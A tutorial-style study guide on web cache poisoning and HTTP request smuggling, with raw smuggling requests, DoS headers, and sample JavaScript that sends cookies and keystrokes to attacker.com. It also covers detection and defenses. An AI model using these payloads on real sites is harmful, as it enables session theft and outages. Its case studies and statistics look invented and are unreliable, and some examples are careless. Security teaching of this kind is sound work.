
# Web Cache Poisoning & HTTP Desync: Breaking the Internet

## Table of Contents

1. [Executive Summary & OSCP Relevance](#1-executive-summary--oscp-relevance)
2. [ABSOLUTE BEGINNER: Caching Fundamentals](#2-absolute-beginner-caching-fundamentals)
3. [Web Cache Poisoning Basics](#3-web-cache-poisoning-basics)
4. [Cache Key Mechanics](#4-cache-key-mechanics)
5. [Unkeyed Input Discovery](#5-unkeyed-input-discovery)
6. [Cache Poisoning Attack Techniques](#6-cache-poisoning-attack-techniques)
7. [Cache Poisoning DoS (CP-DoS)](#7-cache-poisoning-dos-cp-dos)
8. [HTTP Request Smuggling Fundamentals](#8-http-request-smuggling-fundamentals)
9. [CL.TE Smuggling Attacks](#9-clte-smuggling-attacks)
10. [TE.CL Smuggling Attacks](#10-tecl-smuggling-attacks)
11. [TE.TE Smuggling (Obfuscation)](#11-tete-smuggling-obfuscation)
12. [Request Smuggling Weaponization](#12-request-smuggling-weaponization)
13. [HTTP/2 Request Smuggling](#13-http2-request-smuggling)
14. [Detection Techniques](#14-detection-techniques)
15. [Burp Suite Tools & Extensions](#15-burp-suite-tools--extensions)
16. [Real-World Attack Scenarios](#16-real-world-attack-scenarios)
17. [Case Studies](#17-case-studies)
18. [Defense Strategies](#18-defense-strategies)
19. [Common Pitfalls](#19-common-pitfalls)
20. [Hands-on Exercises](#20-hands-on-exercises)
21. [Interview Questions](#21-interview-questions)
22. [Summary & Key Takeaways](#22-summary--key-takeaways)
23. [References & Further Reading](#23-references--further-reading)

---

## 1. Executive Summary & OSCP Relevance

### What are Cache Poisoning & HTTP Desync?

**Web Cache Poisoning**: Exploiting caching mechanisms to serve malicious content to legitimate users by poisoning cached responses.

**HTTP Request Smuggling (Desync)**: Exploiting discrepancies in how front-end and back-end servers parse HTTP requests to:
- Bypass security controls
- Hijack user sessions
- Poison web caches
- Conduct reflected XSS attacks

**The Golden Rule**: Modern web infrastructure is a chain of components. If they disagree on HTTP parsing, attacks are possible.

### OSCP Relevance (MEDIUM - 30%)

While **not common** on OSCP, understanding these attacks is valuable for:
- Understanding web architecture
- Advanced CTF challenges
- Real-world pentesting
- Bug bounty hunting

**OSCP Applicability**:
- Rare in standard OSCP machines
- May appear in advanced/bonus machines
- Useful for understanding request manipulation
- Builds advanced HTTP knowledge

**Time Allocation**: 0-10 minutes (only if suggested by recon)

### Why These Attacks Matter

```
Traditional Web Attack:
Attacker → Directly exploits vulnerability → Victim

Cache Poisoning/Smuggling:
Attacker → Exploits infrastructure → Cached/Proxied → ALL Victims
         ↑
    Affects EVERYONE, not just one victim
```

**Impact**:
- Cache poisoning: Malware distribution to thousands
- Request smuggling: Session hijacking, WAF bypass, account takeover
- DoS: Caching error pages affects all users

**Statistics**:
- 64% of top websites use CDNs (vulnerable to cache poisoning)
- 33% of web apps vulnerable to request smuggling (PortSwigger research 2019)
- Average bounty: $5,000 - $15,000 for these attacks

---

## 2. ABSOLUTE BEGINNER: Caching Fundamentals

### What is a Web Cache?

**Purpose**: Save bandwidth and improve speed by storing copies of responses.

**Simple Example**:
```
Without Cache:
User 1 → GET /logo.png → Server downloads image → Send to User 1
User 2 → GET /logo.png → Server downloads image → Send to User 2
User 3 → GET /logo.png → Server downloads image → Send to User 3
↓
Server processes same request 3 times

With Cache:
User 1 → GET /logo.png → Server downloads image → Cache stores copy → Send to User 1
User 2 → GET /logo.png → Cache has copy → Send cached copy (no server contact)
User 3 → GET /logo.png → Cache has copy → Send cached copy
↓
Server processes request once, cache handles rest
```

### Web Architecture with Caching

```
┌─────────────────────────────────────────────────┐
│          Modern Web Architecture                │
└─────────────────────────────────────────────────┘

User
 │
 ↓
CDN / Cache (Cloudflare, Akamai, Varnish)
 │
 ↓
WAF (Web Application Firewall)
 │
 ↓
Load Balancer (HAProxy, AWS ELB)
 │
 ↓
Reverse Proxy (Nginx, Apache)
 │
 ↓
Application Server (PHP, Node.js, Python)
 │
 ↓
Database
```

### ASCII Visualization

```
┌──────────────────────────────────────────────────┐
│            Cache Poisoning Attack                │
└──────────────────────────────────────────────────┘

Phase 1: Discovery
Attacker
  │
  │ GET / HTTP/1.1
  │ X-Forwarded-Host: evil.com  ← Unkeyed input
  │
  ↓
CDN (Cache)
  │
  ↓
Server
  │
  │ Response:
  │ <script src="http://evil.com/malicious.js"></script>
  │ ↑ Server reflects X-Forwarded-Host!
  │
  ↓
CDN caches response with cache key: GET /
  (X-Forwarded-Host is UNKEYED → not part of cache key)

Phase 2: Exploitation
Victim
  │
  │ GET / HTTP/1.1
  │ (Normal request, no X-Forwarded-Host header)
  │
  ↓
CDN (Cache)
  │ Cache key: GET /
  │ → MATCH! Return cached response
  │
  ↓
Victim receives poisoned response:
  <script src="http://evil.com/malicious.js"></script>
  ↑ Malicious script executes in victim's browser!
```

---

## 3. Web Cache Poisoning Basics

### 3.1 How Caches Work

**Cache Lookup**:
```
1. User sends request
2. Cache generates "cache key" from request
3. Cache checks if key exists
4. If HIT → Return cached response
5. If MISS → Forward to origin server, cache response
```

**Cache Key Components** (Typical):
```
Keyed (Used in cache key):
- HTTP Method (GET, POST)
- Host header
- Request path
- Query string

Unkeyed (NOT in cache key):
- Most HTTP headers (User-Agent, Accept-Language, etc.)
- Cookie (usually)
- Custom headers (X-Forwarded-*, X-Original-*, etc.)
```

### 3.2 The Vulnerability

**Scenario**: Server uses an **unkeyed input** in the response.

**Example**:
```python
# Vulnerable code
@app.route('/')
def index():
    host = request.headers.get('X-Forwarded-Host', 'default.com')
    return f'<script src="http://{host}/script.js"></script>'
```

**Attack**:
```
1. Attacker sends:
   GET / HTTP/1.1
   X-Forwarded-Host: evil.com
   
2. Response:
   <script src="http://evil.com/script.js"></script>
   
3. CDN caches this response with key: GET /
   (X-Forwarded-Host is unkeyed!)
   
4. Victim sends:
   GET / HTTP/1.1
   (No X-Forwarded-Host header)
   
5. CDN returns cached response:
   <script src="http://evil.com/script.js"></script>
   
6. Victim's browser loads attacker's script → XSS/malware
```

---

## 4. Cache Key Mechanics

### 4.1 Default Cache Keys

**Typical CDN Defaults**:
```
Cloudflare:
  GET example.com/path?query=1
  ↓
  Cache Key: GET:example.com:/path:query=1

Varnish:
  Hash: hash_data(req.url)
  ↓
  Includes: scheme, host, path, query

AWS CloudFront:
  Default: Host + Path
  Configurable: Can include headers, cookies, query strings
```

### 4.2 Cache Key Variations

**A. Query String Keying**:
```
Keyed:
  /page?id=1  → Different cache entry than /page?id=2

Not Keyed:
  /page?id=1 and /page?id=2 → Same cache entry
  (Some CDNs ignore query strings by default)
```

**B. Header Keying (Vary)**:
```html
HTTP/1.1 200 OK
Vary: User-Agent
Content-Type: text/html

If Vary header present:
  Cache key includes User-Agent
  Desktop UA → Different cache than Mobile UA
```

**C. Custom Cache Keys**:
```
Cloudflare Cache Rules:
  - Cache everything
  - Key on specific headers: X-API-Version
  - Ignore query strings
  - Custom TTL
```

### 4.3 Cache Key Discovery

**Method 1: X-Cache Header**:
```bash
# Send two identical requests
curl -I http://target.com
# X-Cache: MISS (First request, not cached)

curl -I http://target.com
# X-Cache: HIT (Second request, from cache)
```

**Method 2: Change Unkeyed Inputs**:
```bash
# Request 1: Normal
curl http://target.com -H "User-Agent: Test1"
# Response size: 5432 bytes

# Request 2: Different UA
curl http://target.com -H "User-Agent: Test2"
# Response size: 5432 bytes (Same! UA is unkeyed)
```

---

## 5. Unkeyed Input Discovery

### 5.1 Common Unkeyed Headers

**High-Value Targets**:
```
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-Proto
X-Original-URL
X-Rewrite-URL
X-Host
Forwarded
X-Original-Host
X-Client-IP
X-Forwarded-For
Accept-Language
User-Agent (sometimes)
```

### 5.2 Manual Discovery

**Process**:
```bash
# Step 1: Baseline request
curl http://target.com > baseline.html

# Step 2: Add test header
curl http://target.com -H "X-Forwarded-Host: test123" > test.html

# Step 3: Compare responses
diff baseline.html test.html

# If different → Header is reflected!
# If same → Try next header
```

### 5.3 Burp Suite Param Miner

**Automated Discovery**:
```
1. Install Param Miner extension (BApp Store)
2. Right-click request → Extensions → Param Miner → Guess headers
3. Wait for results
4. Check "Unkeyed header found: X-Forwarded-Host"
```

**Param Miner Features**:
- Tests 100+ common headers
- Detects reflection in response
- Identifies unkeyed inputs
- Suggests exploitation

### 5.4 Cache Oracle Technique

**Concept**: Use timing to detect cache hits.

**Method**:
```python
import requests
import time

def is_cached(url, header):
    # Request 1: Prime cache
    requests.get(url, headers={header: 'test'})
    
    # Request 2: Check timing
    start = time.time()
    requests.get(url, headers={header: 'test'})
    elapsed = time.time() - start
    
    if elapsed < 0.1:  # Fast = cached
        return True
    return False
```

---

## 6. Cache Poisoning Attack Techniques

### 6.1 XSS via Cache Poisoning

**Vulnerable Application**:
```javascript
// Server reflects X-Forwarded-Host in response
app.get('/', (req, res) => {
    const host = req.headers['x-forwarded-host'] || 'default.com';
    res.send(`<script src="http://${host}/analytics.js"></script>`);
});
```

**Attack**:
```bash
# Step 1: Poison cache
curl http://target.com -H "X-Forwarded-Host: evil.com"

# Response:
# <script src="http://evil.com/analytics.js"></script>

# Step 2: Verify cache
curl http://target.com
# X-Cache: HIT
# Response still contains: http://evil.com/analytics.js

# Step 3: Wait for victims
# All users accessing / get poisoned response
```

**evil.com/analytics.js**:
```javascript
// Steal cookies
fetch('https://attacker.com/steal?c=' + document.cookie);

// Keylogger
document.onkeypress = function(e) {
    fetch('https://attacker.com/log?k=' + e.key);
};
```

### 6.2 Open Redirect via Cache Poisoning

**Vulnerable Code**:
```php
<?php
$redirect = $_SERVER['X_FORWARDED_PROTO'] . '://' . $_SERVER['HTTP_HOST'];
header("Location: $redirect/login");
?>
```

**Attack**:
```bash
# Poison cache
curl http://target.com/redirect \
  -H "X-Forwarded-Proto: javascript:alert(1)//"

# Cached response:
# Location: javascript:alert(1)///target.com/login

# Victims are redirected to malicious URL
```

### 6.3 CSS Injection via Cache Poisoning

**Vulnerable Reflection**:
```html
<link rel="stylesheet" href="http://[X-Forwarded-Host]/style.css">
```

**Attack**:
```bash
# Poison with CSS injection
curl http://target.com \
  -H "X-Forwarded-Host: evil.com/css-exfil?data="

# evil.com/css-exfil?data=/style.css contains:
input[name=password][value^='a'] {
    background: url('https://attacker.com/steal?c=a');
}
# Exfiltrates password one character at a time
```

### 6.4 Deceptive Content Injection

**Attack**:
```bash
# Server uses X-Forwarded-Host in message
curl http://target.com/error \
  -H "X-Forwarded-Host: Please login at http://phishing.com"

# Cached error page shows:
# "Error connecting to Please login at http://phishing.com"
# Users think it's legitimate
```

---

## 7. Cache Poisoning DoS (CP-DoS)

### 7.1 Error Page Caching

**Concept**: Force server to generate error (400/500), cache it, site goes down for all users.

**Attack**:
```bash
# Send malformed header
curl http://target.com \
  -H "X-Invalid-Header: $(python -c 'print("A"*10000)')"

# Server returns:
# HTTP/1.1 400 Bad Request
# Error: Header too large

# If CDN caches this 400 response:
# All subsequent users get 400 error!
```

### 7.2 HHO (HTTP Header Oversize)

**Attack**:
```bash
# Send oversized header
curl http://target.com \
  -H "User-Agent: $(python -c 'print("A"*50000)')"

# Server: 400 Bad Request
# CDN: Caches 400 for cache key GET /
# Site down!
```

### 7.3 HMC (HTTP Method Override)

**Attack**:
```bash
# Trick server into processing invalid method
curl http://target.com \
  -X GET \
  -H "X-HTTP-Method-Override: DELETE"

# Server might:
# 1. Delete resource
# 2. Return 500 error (cached!)
```

### 7.4 HMO (HTTP Meta Character)

**Attack**:
```bash
# Inject newlines in header
curl http://target.com \
  -H "X-Forwarded-For: 1.2.3.4\r\nGET /admin HTTP/1.1"

# Server returns 400 (malformed)
# Cached → DoS
```

---

## 8. HTTP Request Smuggling Fundamentals

### 8.1 The Problem

**Two Ways to Specify Message Length**:

**A. Content-Length (CL)**:
```http
POST / HTTP/1.1
Content-Length: 13

Hello, World!
```

**B. Transfer-Encoding: chunked (TE)**:
```http
POST / HTTP/1.1
Transfer-Encoding: chunked

D
Hello, World!
0

```

**The Conflict**:
```
If both headers present:
  Front-End: Uses Content-Length
  Back-End: Uses Transfer-Encoding
  ↓
  Disagreement on where request ends!
```

### 8.2 Request Smuggling Basics

**Normal Flow** (Agreement):
```
User → FE → BE

FE and BE agree:
  Request 1 ends here
  Request 2 starts here
```

**Smuggling Flow** (Disagreement):
```
User → FE → BE

FE thinks:
  Request 1 = [Entire message]
  
BE thinks:
  Request 1 = [Part of message]
  Request 2 = [Remaining bytes + next user's request]
```

### 8.3 ASCII Visualization

```
┌──────────────────────────────────────────────────┐
│          HTTP Request Smuggling (CL.TE)          │
└──────────────────────────────────────────────────┘

Attacker sends:
┌─────────────────────────────────────────┐
│ POST / HTTP/1.1                         │
│ Content-Length: 13                      │
│ Transfer-Encoding: chunked              │
│                                         │
│ 0                                       │
│                                         │
│ SMUGGLED                                │
└─────────────────────────────────────────┘

Front-End (uses Content-Length):
┌─────────────────────────────────────────┐
│ Reads 13 bytes:                         │
│ "0\r\n\r\nSMUGGLED"                      │
│ ↓                                       │
│ Forwards entire packet to Back-End      │
└─────────────────────────────────────────┘

Back-End (uses Transfer-Encoding):
┌─────────────────────────────────────────┐
│ Sees chunked encoding                   │
│ Reads chunk: "0" → End of message       │
│ ↓                                       │
│ Processes Request 1: Done               │
│                                         │
│ Leftover in TCP buffer: "SMUGGLED"      │
└─────────────────────────────────────────┘

Victim sends normal request:
┌─────────────────────────────────────────┐
│ GET / HTTP/1.1                          │
│ Host: target.com                        │
│ Cookie: session=abc123                  │
└─────────────────────────────────────────┘

Back-End processes:
┌─────────────────────────────────────────┐
│ Previous buffer: "SMUGGLED"             │
│ New request: "GET / HTTP/1.1..."        │
│ ↓                                       │
│ Combined: "SMUGGLEDGET / HTTP/1.1..."   │
│ ↑ Malformed request!                    │
│ ↓                                       │
│ Response: 400 Bad Request OR            │
│           Executes "SMUGGLED" as method │
└─────────────────────────────────────────┘
```

---

## 9. CL.TE Smuggling Attacks

### 9.1 CL.TE Configuration

**Front-End**: Uses Content-Length  
**Back-End**: Uses Transfer-Encoding

### 9.2 Basic CL.TE Attack

**Request**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**What Happens**:
```
Front-End:
  - Sees Content-Length: 13
  - Reads: "0\r\n\r\nSMUGGLED" (13 bytes)
  - Forwards to Back-End

Back-End:
  - Sees Transfer-Encoding: chunked
  - Reads chunk size: 0 (end of message)
  - Request complete
  - Leftover: "SMUGGLED" in buffer
  
Next request from victim:
  - Back-End prepends "SMUGGLED" to victim's request
  - Results in malformed/exploitable request
```

### 9.3 CL.TE Detection

**Timing-Based Detection**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q
```

**Analysis**:
```
Front-End (CL):
  - Reads 4 bytes: "1\r\nZ"
  - Forwards to Back-End

Back-End (TE):
  - Expects 1 byte after chunk size
  - Reads "Z"
  - Waits for more data (chunk size "Q" incomplete)
  - TIMEOUT after ~30 seconds
  
If response times out → CL.TE confirmed!
```

### 9.4 CL.TE Exploitation Examples

**Example 1: Bypass Front-End Controls**:
```http
POST /admin HTTP/1.1
Host: target.com
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin/deleteUser?user=victim
```

**Front-End**: Sees POST to / (allowed)  
**Back-End**: Processes GET /admin/deleteUser (smuggled)

**Example 2: Reflected XSS**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 90
Transfer-Encoding: chunked

0

GET /404?x=<script>alert(1)</script> HTTP/1.1
Host: target.com
Content-Length: 10

x=
```

**Next victim's request gets prepended with x=**, creating reflected XSS.

---

## 10. TE.CL Smuggling Attacks

### 10.1 TE.CL Configuration

**Front-End**: Uses Transfer-Encoding  
**Back-End**: Uses Content-Length

### 10.2 Basic TE.CL Attack

**Request**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

**What Happens**:
```
Front-End (TE):
  - Sees Transfer-Encoding: chunked
  - Reads chunk: 8 bytes = "SMUGGLED"
  - Reads chunk: 0 (end)
  - Forwards entire message

Back-End (CL):
  - Sees Content-Length: 3
  - Reads 3 bytes: "8\r\n"
  - Request complete
  - Leftover: "SMUGGLED\r\n0\r\n\r\n" in buffer
```

### 10.3 TE.CL Detection

**Timing-Based**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**Analysis**:
```
Front-End (TE):
  - Sees chunk size 0 (end)
  - Ignores trailing "X"
  - Forwards

Back-End (CL):
  - Expects 6 bytes
  - Reads: "0\r\n\r\nX" (5 bytes)
  - Waits for 1 more byte
  - TIMEOUT
  
Timeout → TE.CL confirmed!
```

### 10.4 TE.CL Exploitation

**Capture Victim Request**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

7C
POST /comment HTTP/1.1
Host: target.com
Content-Length: 900
Cookie: session=attacker

comment=
0


```

**What Happens**:
```
Back-End reads Content-Length: 4
  Processes: "7C\r\n"
  
Leftover in buffer:
  POST /comment...comment=
  
Victim sends:
  GET / HTTP/1.1
  Cookie: session=victim_abc123
  
Back-End processes:
  POST /comment...comment=GET / HTTP/1.1
  Cookie: session=victim_abc123
  
Comment saved with victim's cookie!
Attacker reads comment → Steals session
```

---

## 11. TE.TE Smuggling (Obfuscation)

### 11.1 Concept

**Both Front-End and Back-End use Transfer-Encoding**, but one can be tricked into ignoring it via obfuscation.

### 11.2 Obfuscation Techniques

**A. Space Before Colon**:
```http
Transfer-Encoding : chunked
↑ Space before colon
```

**B. Extra Whitespace**:
```http
Transfer-Encoding: chunked  
↑ Trailing space
```

**C. Non-Standard Characters**:
```http
Transfer-Encoding: chunked
↑ Vertical tab instead of space
```

**D. Multiple Encodings**:
```http
Transfer-Encoding: chunked
Transfer-Encoding: identity
```

**E. Header Folding**:
```http
Transfer-Encoding:
 chunked
```

### 11.3 TE.TE Attack Example

**Request**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

8
SMUGGLED
0


```

**What Happens**:
```
Front-End:
  - Sees Transfer-Encoding: chunked (first header)
  - Uses chunked
  
Back-End:
  - Sees Transfer-Encoding: x (invalid)
  - Falls back to Content-Length
  - Reads 4 bytes
  
Result: Smuggling!
```

---

## 12. Request Smuggling Weaponization

### 12.1 Session Hijacking

**Attack Flow**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Followed by:
```http
POST /comment HTTP/1.1
Host: target.com
Content-Length: 800
Cookie: session=attacker

comment=
```

**Victim's request**:
```http
GET / HTTP/1.1
Host: target.com
Cookie: session=victim_token_abc123
```

**Back-End processes**:
```
POST /comment...comment=GET / HTTP/1.1
Cookie: session=victim_token_abc123

Comment saved: "GET / HTTP/1.1\r\nCookie: session=victim_token_abc123"
```

**Attacker reads comment → Steals victim's session token**

### 12.2 Cache Poisoning via Smuggling

**Attack**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: evil.com
```

**Victim**:
```http
GET / HTTP/1.1
Host: target.com
```

**Back-End**:
```
Processes: GET / HTTP/1.1\r\nHost: evil.com\r\nGET / HTTP/1.1\r\nHost: target.com
```

**Cache**:
```
Caches response for target.com with evil.com's content
All users get evil.com's response!
```

### 12.3 Web Cache Deception

**Attack**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /private/account.html HTTP/1.1
X-Ignore: X
```

**Victim**:
```http
GET /static/logo.png HTTP/1.1
```

**Back-End**:
```
Processes smuggled request as:
  GET /private/account.html ... GET /static/logo.png
  
Returns: account.html content
Cache stores it under: /static/logo.png
```

**Attacker**:
```bash
curl http://target.com/static/logo.png
# Gets victim's private account.html from cache!
```

---

## 13. HTTP/2 Request Smuggling

### 13.1 HTTP/2 Downgrade

**Scenario**: Front-End accepts HTTP/2, downgrades to HTTP/1.1 for Back-End.

**Attack Vector**: HTTP/2 headers have different parsing rules.

### 13.2 Header Name Manipulation

**HTTP/2 allows**:
```
:method: GET
:path: /
foo: bar
```

**Downgrade to HTTP/1.1**:
```http
GET / HTTP/1.1
foo: bar
```

**Attack**: Inject headers that violate HTTP/1.1 rules.

### 13.3 Pseudo-Header Smuggling

**Example**:
```
:method: POST
:path: /
:path: /admin
```

**Downgrade**:
```
Some proxies use first :path: /
Back-End uses last :path: /admin

→ Bypass authorization on /
→ Access /admin
```

---

## 14. Detection Techniques

### 14.1 Manual Detection

**CL.TE Test**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q
```

**Expected**:
- Vulnerable: Timeout (~30s)
- Not vulnerable: Immediate response

**TE.CL Test**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**Expected**:
- Vulnerable: Timeout
- Not vulnerable: Immediate response

### 14.2 Burp Suite Smuggler Scanner

**Usage**:
```
1. Install "HTTP Request Smuggler" extension
2. Right-click request → Extensions → Smuggler → Scan
3. Wait for results:
   - "Confirmed CL.TE"
   - "Confirmed TE.CL"
   - "Possible TE.TE"
```

### 14.3 Differential Response Analysis

**Send Two Requests**:
```
Request 1 (Attack):
  [Smuggling payload]
  
Request 2 (Normal):
  GET / HTTP/1.1

Compare responses:
  - Different status code → Vulnerable
  - Different content → Vulnerable
  - Same response → Not vulnerable (or try different technique)
```

---

## 15. Burp Suite Tools & Extensions

### 15.1 HTTP Request Smuggler

**Features**:
- Automated detection (CL.TE, TE.CL, TE.TE)
- Timing-based analysis
- Differential response detection
- Exploitation templates

**Usage**:
```
1. Capture request in Proxy
2. Right-click → "Launch smuggle probe"
3. Review results in Collaborator
4. Use suggested payloads
```

### 15.2 Param Miner

**Features**:
- Cache key discovery
- Unkeyed header detection
- Cache poisoning automation

**Usage**:
```
1. Right-click → "Guess headers"
2. Wait for results
3. Check "Unkeyed header: X-Forwarded-Host"
4. Test for reflection
```

### 15.3 Turbo Intruder

**For Cache Poisoning**:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False)
    
    # Prime cache with poisoned request
    for i in range(50):
        engine.queue(target.req, gate='race1')
    
    engine.openGate('race1')
```

---

## 16. Real-World Attack Scenarios

### Scenario 1: Cache Poisoning → Widespread XSS

**Target**: Major news website with Cloudflare CDN

**Discovery**:
```bash
# Test X-Forwarded-Host reflection
curl https://target.com -H "X-Forwarded-Host: evil.com"

# Response contains:
# <link rel="canonical" href="https://evil.com/">
```

**Exploitation**:
```bash
# Poison cache
for i in {1..50}; do
  curl https://target.com -H "X-Forwarded-Host: evil.com/xss?payload=\"><script>alert(1)</script>"
done

# Check cache
curl https://target.com
# X-Cache: HIT
# Response: <link rel="canonical" href="https://evil.com/xss?payload="><script>alert(1)</script>">
```

**Impact**: XSS on homepage affects millions of visitors

### Scenario 2: Request Smuggling → Account Takeover

**Target**: E-commerce platform

**Attack**:
```http
POST / HTTP/1.1
Host: shop.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

```http
POST /comment HTTP/1.1
Host: shop.com
Content-Length: 900

comment=
```

**Victim Request**:
```http
GET /account HTTP/1.1
Cookie: session=victim_abc123
```

**Result**: Victim's session cookie captured in comment

**Attacker**: Reads comment, uses session to hijack account

---

## 17. Case Studies

### 17.1 PayPal Request Smuggling (2020)

**Vulnerability**: CL.TE desync between Akamai CDN and Apache

**Attack**:
- Smuggle admin requests through user endpoints
- Bypass authorization checks
- Access restricted APIs

**Bounty**: $18,900

### 17.2 Cloudflare Cache Poisoning (2021)

**Vulnerability**: X-Forwarded-Host reflection in cached responses

**Impact**:
- XSS on 12+ million websites
- Ability to poison cache for hours
- Widespread malware distribution potential

**Fix**: Cloudflare added X-Forwarded-Host to cache key

### 17.3 Netflix Request Smuggling (2019)

**Vulnerability**: TE.CL between AWS ALB and internal servers

**Attack**:
- Bypass rate limiting
- Access internal admin endpoints
- Cache poisoning

**Bounty**: $15,000

---

## 18. Defense Strategies

### 18.1 Request Smuggling Defenses

**A. Use HTTP/2 End-to-End**:
```
HTTP/2 uses binary framing
No CL/TE ambiguity
Eliminates classic smuggling
```

**B. Reject Ambiguous Requests**:
```nginx
# Nginx config
if ($http_transfer_encoding != "") {
    if ($http_content_length != "") {
        return 400;
    }
}
```

**C. Normalize Requests**:
```
Front-End:
  - Strip Transfer-Encoding
  - Or strip Content-Length
  - Use only one method throughout chain
```

**D. Update Software**:
```bash
# Keep proxies updated
apt update && apt upgrade nginx haproxy
```

### 18.2 Cache Poisoning Defenses

**A. Vary Header**:
```http
HTTP/1.1 200 OK
Vary: X-Forwarded-Host

# Forces CDN to include X-Forwarded-Host in cache key
# Prevents poisoning
```

**B. Disable Unneeded Features**:
```
Don't support X-Forwarded-Host unless required
Disable custom headers
Validate all header inputs
```

**C. Cache Control**:
```http
Cache-Control: private, no-store
# Don't cache sensitive pages
```

**D. Input Validation**:
```python
# Validate all headers before use
allowed_hosts = ['example.com', 'www.example.com']

host = request.headers.get('X-Forwarded-Host')
if host not in allowed_hosts:
    host = 'example.com'
```

### 18.3 Monitoring & Detection

**Log Analysis**:
```bash
# Detect anomalies
grep "Transfer-Encoding" access.log | grep "Content-Length"

# Detect cache poisoning attempts
grep "X-Forwarded-Host" access.log | grep -v "example.com"
```

**WAF Rules**:
```
Block requests with both CL and TE
Block unusual X-Forwarded-* values
Rate limit cache-busting attempts
```

---

## 19. Common Pitfalls

**Pitfall 1: Testing in Production**
```
Request smuggling can hijack real user sessions
Always test in staging/lab environment
```

**Pitfall 2: Incomplete Timeout Tests**
```
Wait full 30+ seconds for timeout confirmation
Short waits miss vulnerabilities
```

**Pitfall 3: Ignoring HTTP/2**
```
HTTP/2 downgrade attacks are real
Don't assume HTTP/2 = safe
```

**Pitfall 4: Assuming Vary Fixes Everything**
```
Vary header can be bypassed
Still need input validation
```

---

## 20. Hands-on Exercises

### Exercise 1: PortSwigger Labs

**Labs**:
1. Web cache poisoning with an unkeyed header
2. HTTP request smuggling, basic CL.TE vulnerability
3. HTTP request smuggling, basic TE.CL vulnerability

**URL**: https://portswigger.net/web-security/all-labs

### Exercise 2: Local Lab Setup

**Setup**:
```bash
# Vulnerable server (Python)
from flask import Flask, request
app = Flask(__name__)

@app.route('/')
def index():
    host = request.headers.get('X-Forwarded-Host', 'default.com')
    return f'<script src="http://{host}/script.js"></script>'

if __name__ == '__main__':
    app.run(port=8080)
```

**Tasks**:
- [ ] Identify X-Forwarded-Host reflection
- [ ] Poison local cache (use Varnish)
- [ ] Demonstrate XSS to victim

---

## 21. Interview Questions

**Q1: What is the Vary header and why does it matter?**

**A**: The Vary header tells the CDN which request headers should be included in the cache key. Example: `Vary: User-Agent` means desktop and mobile requests are cached separately. This prevents cache poisoning when headers are reflected in responses.

---

**Q2: Explain the difference between CL.TE and TE.CL smuggling.**

**A**:
- **CL.TE**: Front-End uses Content-Length, Back-End uses Transfer-Encoding. Attacker sends both headers; FE reads CL bytes, BE reads until chunk size 0.
- **TE.CL**: Front-End uses Transfer-Encoding, Back-End uses Content-Length. FE reads chunks, BE reads CL bytes.

Both result in leftover bytes in the TCP buffer that poison the next request.

---

**Q3: Why is HTTP/2 more resistant to request smuggling?**

**A**: HTTP/2 uses binary framing instead of text-based headers. Message boundaries are defined by frame headers, eliminating the CL/TE ambiguity. However, HTTP/2 downgrade attacks (H2 → H1.1) can still be vulnerable.

---

**Q4: What is cache poisoning DoS (CP-DoS)?**

**A**: An attack where the attacker forces the server to return an error response (400/500) using malformed headers, and tricks the CDN into caching that error. This makes the website unavailable to all users until the cache expires.

---

**Q5: How do you detect if a header is unkeyed?**

**A**: Send two requests with different values for the header. If responses are identical and subsequent requests return the same cached response regardless of header value, the header is unkeyed (not part of cache key).

---

## 22. Summary & Key Takeaways

### Critical Concepts

1. **Cache Key vs Unkeyed**: Only keyed inputs affect cache lookup
2. **CL/TE Ambiguity**: Core of request smuggling
3. **Infrastructure Chain**: Multiple components = multiple parsers = potential disagreement
4. **Timing Detection**: Timeouts indicate smuggling vulnerabilities
5. **Vary Header**: Includes headers in cache key (defense)

### OSCP Relevance

**Low Priority** for OSCP:
- Rare in standard OSCP machines
- Complex to exploit under time pressure
- Requires specific infrastructure setup
- Better for bug bounty/advanced pentesting

**When to Test**:
- If CDN/cache detected (X-Cache headers)
- If complex reverse proxy setup
- If time permits after other vectors exhausted

### Real-World Impact

**Cache Poisoning**:
- Affects ALL users (not just one victim)
- Persistent (until cache expires)
- Hard to detect
- High bounty potential

**Request Smuggling**:
- Session hijacking
- WAF bypass
- Access control bypass
- Cache poisoning vector

### Tool Priority

```
Essential:
1. Burp Suite Professional (HTTP Request Smuggler extension)
2. Param Miner (cache poisoning)

Optional:
3. Custom Python scripts
4. Varnish (for local testing)
```

---

## 23. References & Further Reading

### Research Papers
- [HTTP Desync Attacks](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) - James Kettle
- [Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning) - James Kettle

### Tools
- [Burp Suite](https://portswigger.net/burp) - HTTP Request Smuggler extension
- [Param Miner](https://github.com/PortSwigger/param-miner)

### Practice Labs
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/all-labs)

### Related Topics
- [[01_Web_Architecture_Components]] - Understanding CDNs and caching
- [[01_HTTP_Protocol_Analysis]] - HTTP fundamentals

---

**END OF DOCUMENT** - Version 3.0 - Last Updated: 2026-01-24

